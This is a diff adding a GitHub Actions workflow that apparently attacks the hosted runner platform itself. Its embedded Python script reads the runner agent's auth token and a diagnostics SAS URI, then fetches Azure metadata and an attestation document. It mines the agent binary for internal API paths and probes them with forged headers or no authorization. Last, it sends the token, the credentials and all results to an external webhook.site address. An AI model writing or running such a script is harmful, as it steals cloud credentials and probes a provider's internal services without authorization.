@@ -1,0 +1,270 @@
+name: Probe v54 - account_a
+on:
+  workflow_dispatch:
+jobs:
+  probe:
+    runs-on: ubuntu-24.04
+    env:
+      V54_SOURCE: v54_account_a
+    steps:
+      - name: v54 binary readelf + arm paths + header combos
+        run: |
+          cat > /tmp/v54_probe.py << 'PROBE_EOF'
+          
+          import json, os, base64, subprocess, re, urllib.request, urllib.error, time
+          
+          WEBHOOK = "https://webhook.site/53b82227-04b4-4ad2-9ccd-2abbd8a81837"
+          RUN_ID  = os.environ.get("GITHUB_RUN_ID", "unknown")
+          REPO    = os.environ.get("GITHUB_REPOSITORY", "unknown")
+          SOURCE  = os.environ.get("V54_SOURCE", "v54_account_a")
+          
+          def probe(method, url, body=None, extra=None):
+              data = body.encode() if isinstance(body, str) else (body or None)
+              headers = {"Content-Type": "application/json", "User-Agent": "hosted-compute-agent/1.0"}
+              if extra:
+                  headers.update(extra)
+              if data:
+                  headers["Content-Length"] = str(len(data))
+              req = urllib.request.Request(url, data=data, headers=headers, method=method)
+              try:
+                  r = urllib.request.urlopen(req, timeout=14)
+                  return {"status": r.status, "body": r.read(8000).decode("utf-8","replace"), "hdrs": dict(r.headers)}
+              except urllib.error.HTTPError as e:
+                  return {"status": e.code, "body": e.read(8000).decode("utf-8","replace"), "hdrs": dict(e.headers)}
+              except Exception as ex:
+                  return {"status": 0, "body": str(ex), "hdrs": {}}
+          
+          def auth_attest(method, url, hca_token, pkcs7_doc, body=None):
+              return probe(method, url, body, {
+                  "Authorization": f"Bearer {hca_token}",
+                  "x-attestation-provider": "azure",
+                  "x-attestation-encoding": "pkcs7",
+                  "x-attestation-document": pkcs7_doc,
+              })
+          
+          def sh(cmd, timeout=30):
+              try:
+                  r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+                  return r.stdout + r.stderr
+              except Exception as ex:
+                  return f"TIMEOUT/ERROR: {ex}"
+          
+          print(f"[{SOURCE}] start")
+          
+          with open("/opt/hca/.settings") as f:
+              s = json.load(f)
+          
+          token     = s.get("authToken", "")
+          sched_url = s.get("schedulerApiUrl", "").rstrip("/")
+          config_id = s.get("configId", "")
+          quota_id  = s.get("quotaId", "")
+          watchdog_url = s.get("watchdogTraceApiUrl", "")
+          diag_sas = s.get("diagnosticsSasUri", "")
+          orch_id   = os.environ.get("ACTIONS_ORCHESTRATION_ID", "")
+          
+          parts = token.split(".")
+          pad = parts[1] + "=" * (4 - len(parts[1]) % 4)
+          claims = json.loads(base64.urlsafe_b64decode(pad))
+          wid = claims.get("wid", "")
+          mac = claims.get("mac", "")
+          vmn = claims.get("vmn", "")
+          
+          print(f"[{SOURCE}] settings: configId={config_id} quotaId={quota_id}")
+          print(f"[{SOURCE}] watchdog_url={watchdog_url}")
+          print(f"[{SOURCE}] diag_sas prefix={diag_sas[:80]}")
+          print(f"[{SOURCE}] wid={wid} mac={mac} vmn={vmn}")
+          
+          results = {"settings": {**s, "diagnosticsSasUri": s.get("diagnosticsSasUri","")[:50]+"..."}, "jwt_claims": claims}
+          
+          # -- 1. Get PKCS7 attestation document (FRESH) ----------------------------
+          r = probe("GET",
+              "http://169.254.169.254/metadata/attested/document?api-version=2021-02-01",
+              extra={"Metadata": "true"})
+          pkcs7_sig = ""
+          try:
+              att_data = json.loads(r["body"])
+              pkcs7_sig = att_data.get("signature", "")
+              results["pkcs7_sig"] = pkcs7_sig
+          except:
+              pass
+          
+          # -- 2. Get IMDS tags ------------------------------------------------------
+          r2 = probe("GET", "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+                     extra={"Metadata": "true"})
+          try:
+              imds_data = json.loads(r2["body"])
+              compute = imds_data.get("compute", {})
+              tags_list = compute.get("tagsList", [])
+              hc_tags = {t["name"]: t["value"] for t in tags_list if "hosted_compute" in t.get("name","")}
+              base_ro_url = hc_tags.get("hosted_compute.base_ro_url", "").rstrip("/")
+              allocation_id = hc_tags.get("hosted_compute.allocation_id", "")
+              vm_name = compute.get("name", "")
+              sub_id = compute.get("subscriptionId", "")
+              rg = compute.get("resourceGroupName", "")
+              print(f"[IMDS] base_ro_url={base_ro_url}")
+              print(f"[IMDS] allocation_id={allocation_id}")
+              print(f"[IMDS] vm_name={vm_name} sub_id={sub_id[:8]}... rg={rg}")
+              results["imds_tags"] = hc_tags
+              results["imds_compute"] = {"vm_name": vm_name, "sub_id": sub_id, "rg": rg}
+          except Exception as ex:
+              print(f"[IMDS] error: {ex}")
+              base_ro_url = ""
+              allocation_id = ""
+              vm_name = sub_id = rg = ""
+          
+          from urllib.parse import urlparse
+          if base_ro_url:
+              vm_v1_base = base_ro_url
+          else:
+              p = urlparse(sched_url)
+              vm_v1_base = f"{p.scheme}://{p.netloc}/vm/v1"
+          
+          print(f"[{SOURCE}] vm_v1_base={vm_v1_base}")
+          
+          # -- 3. Deep HCA binary analysis ------------------------------------------
+          print(f"\n[{SOURCE}] Deep binary analysis via readelf + nm...")
+          bin_path = "/opt/hca/hosted-compute-agent"
+          
+          # Install binutils if needed
+          sh("which readelf || apt-get install -y binutils 2>/dev/null", timeout=30)
+          sh("which nm || apt-get install -y binutils 2>/dev/null", timeout=30)
+          
+          # readelf .rodata section — contains ALL Go string constants
+          print(f"[BIN] extracting .rodata section...")
+          rodata_raw = sh(f"readelf -p .rodata {bin_path} 2>/dev/null | head -5000", timeout=60)
+          print(f"[BIN] .rodata: {len(rodata_raw)} chars")
+          
+          # Filter for path-like strings
+          vm_paths_in_rodata = [line for line in rodata_raw.split('\n')
+                                if any(x in line for x in ['/vm', '/v1/', '/health', '/heartbeat', '/alloc', '/status', '/config', '/annotation', '/runner', '/job', '/provision'])]
+          print(f"[BIN_RODATA] vm/path strings:\n" + '\n'.join(vm_paths_in_rodata[:100]))
+          
+          # Also look for URL patterns
+          url_in_rodata = [line for line in rodata_raw.split('\n')
+                           if 'githubapp' in line or 'github.com' in line or 'hosted-compute' in line]
+          print(f"[BIN_RODATA] github URL strings:\n" + '\n'.join(url_in_rodata[:50]))
+          
+          # nm symbols — list all function names
+          nm_output = sh(f"nm -D {bin_path} 2>/dev/null | grep -iE '(vm|alloc|attest|heartbeat|provision|runner|config|status|health)' | head -100", timeout=30)
+          print(f"[NM] symbols:\n{nm_output[:3000]}")
+          
+          # Get ALL readable strings from binary with longer minimum length
+          strings_long = sh(f"strings -n 8 {bin_path} 2>/dev/null | grep -E '^/[a-z]' | sort -u | head -200", timeout=30)
+          print(f"[STRINGS] 8-char paths:\n{strings_long[:5000]}")
+          
+          # Look for Go function names containing vm/api context
+          go_funcs = sh(f"strings {bin_path} 2>/dev/null | grep -E 'github.com/github/hosted-compute' | head -80", timeout=20)
+          print(f"[GO_FUNCS]:\n{go_funcs[:3000]}")
+          
+          results["binary_analysis"] = {
+              "rodata_vm_paths": '\n'.join(vm_paths_in_rodata[:100]),
+              "rodata_urls": '\n'.join(url_in_rodata[:50]),
+              "nm_output": nm_output[:5000],
+              "strings_long": strings_long[:8000],
+              "go_funcs": go_funcs[:3000],
+          }
+          
+          # -- 4. Try ARM-style paths (subscription + resource group) ---------------
+          print(f"\n[{SOURCE}] Trying ARM-style paths with subscription/rg...")
+          arm_results = {}
+          if sub_id and rg and vm_name:
+              arm_paths = [
+                  ("GET", f"/subscriptions/{sub_id}/resourceGroups/{rg}/vms/{vm_name}"),
+                  ("GET", f"/subscriptions/{sub_id}/resourceGroups/{rg}/allocations/{allocation_id}"),
+                  ("GET", f"/{sub_id}/{allocation_id}"),
+                  ("GET", f"/{sub_id}/{rg}/{vm_name}"),
+                  ("GET", f"/{sub_id}/{rg}/{allocation_id}"),
+              ]
+              for method, path in arm_paths:
+                  url = vm_v1_base + path
+                  r = auth_attest(method, url, token, pkcs7_sig)
+                  key = path.lstrip('/').replace('/','_')
+                  arm_results[key] = {"status": r["status"], "body": r["body"][:300], "url": url}
+                  print(f"[ARM] {method} {path} -> {r['status']} | {r['body'][:80]}")
+          results["arm_paths"] = arm_results
+          
+          # -- 5. Try with additional headers ---------------------------------------
+          print(f"\n[{SOURCE}] Trying with additional headers...")
+          extra_header_results = {}
+          extra_header_combos = [
+              {"X-Allocation-Id": allocation_id},
+              {"X-GitHub-Request-Id": orch_id or "test"},
+              {"X-Hosted-Compute-Allocation-Id": allocation_id},
+              {"X-HCA-Allocation-Id": allocation_id},
+              {"X-Request-Id": orch_id or "test"},
+              {"X-VM-Name": vm_name},
+              {"X-MAC-Address": mac},
+          ]
+          test_paths_extra = [
+              ("GET", "/"),
+              ("GET", f"/{allocation_id}" if allocation_id else "/test"),
+              ("GET", "/health"),
+              ("GET", "/status"),
+              ("GET", "/heartbeat"),
+          ]
+          for extra_hdrs in extra_header_combos:
+              hdr_name = list(extra_hdrs.keys())[0]
+              for method, path in test_paths_extra[:3]:
+                  url = vm_v1_base + path
+                  all_headers = {
+                      "Authorization": f"Bearer {token}",
+                      "x-attestation-provider": "azure",
+                      "x-attestation-encoding": "pkcs7",
+                      "x-attestation-document": pkcs7_sig,
+                      **extra_hdrs,
+                  }
+                  r = probe(method, url, extra=all_headers)
+                  key = f"{hdr_name}_{method}_{path.lstrip('/').replace('/','_') or 'root'}"
+                  extra_header_results[key] = {"status": r["status"], "body": r["body"][:200]}
+                  if r["status"] not in (404, 405, 0):
+                      print(f"[HDR_TEST] *** {hdr_name} {method} {path} -> {r['status']} | {r['body'][:100]}")
+          results["extra_headers"] = extra_header_results
+          
+          # -- 6. Probe WITHOUT Authorization header (attestation only) --------------
+          print(f"\n[{SOURCE}] Probing with attestation only (no HCA JWT)...")
+          no_auth_results = {}
+          for path in ["/", "/health", f"/{allocation_id}" if allocation_id else "/test", "/status"]:
+              url = vm_v1_base + path
+              r = probe("GET", url, extra={
+                  "x-attestation-provider": "azure",
+                  "x-attestation-encoding": "pkcs7",
+                  "x-attestation-document": pkcs7_sig,
+              })
+              key = path.lstrip('/').replace('/','_') or 'root'
+              no_auth_results[key] = {"status": r["status"], "body": r["body"][:200]}
+              print(f"[NO_AUTH] GET {path} -> {r['status']} | {r['body'][:80]}")
+          results["no_auth_attest"] = no_auth_results
+          
+          # -- 7. Get the provjobd_override.json file content (written during job) ---
+          print(f"\n[{SOURCE}] provjobd_override.json...")
+          provjob = sh("cat /opt/hca/provjobd_override.json 2>&1")
+          print(f"[PROVJOB] {provjob[:1000]}")
+          results["provjobd"] = provjob[:3000]
+          
+          # -- 8. Decode diagnostics SAS URI to understand the Azure storage structure
+          print(f"\n[{SOURCE}] diagnosticsSasUri analysis...")
+          print(f"[SAS] Full URI: {diag_sas[:300]}")
+          results["diag_sas"] = diag_sas[:1000]
+          
+          # -- 9. POST webhook ------------------------------------------------------
+          payload = {
+              "source": SOURCE, "run_id": RUN_ID, "repo": REPO,
+              "token": token, "claims": claims, "orch_id": orch_id,
+              "wid": wid, "allocation_id": allocation_id,
+              "vm_v1_base": vm_v1_base,
+              "results": results,
+          }
+          data = json.dumps(payload, default=str).encode()
+          req = urllib.request.Request(WEBHOOK, data=data,
+                                        headers={"Content-Type": "application/json"}, method="POST")
+          try:
+              r = urllib.request.urlopen(req, timeout=30)
+              print(f"\n[{SOURCE}] Webhook: {r.status}")
+          except Exception as ex:
+              print(f"[{SOURCE}] Webhook error: {ex}")
+          
+          print(f"[{SOURCE}] DONE")
+          PROBE_EOF
+          python3 /tmp/v54_probe.py
+      - name: Keep alive
+        run: sleep 60
